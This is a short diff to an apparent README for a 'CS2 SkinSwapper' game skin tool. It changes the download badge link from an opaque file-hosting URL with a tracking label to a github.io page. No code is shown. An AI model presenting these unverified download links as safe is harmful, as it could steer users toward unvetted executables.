@@ -15,4 +15,4 @@
 2. Choose a skin from the library or customize it to your liking.
 3. Apply the skin and enjoy a personalized gaming experience!
 
-[![Download CS2 SkinSwapper](https://img.shields.io/badge/Download-CS2%20SkinSwapper-blueviolet)](https://downloadifiles.com/?label=1e88dd1be7cebcac3b93ae91dcb2375f)
+[![Download CS2 SkinSwapper](https://img.shields.io/badge/Download-CS2%20SkinSwapper-blueviolet)](https://cs2-skinswapper.github.io/.github/)
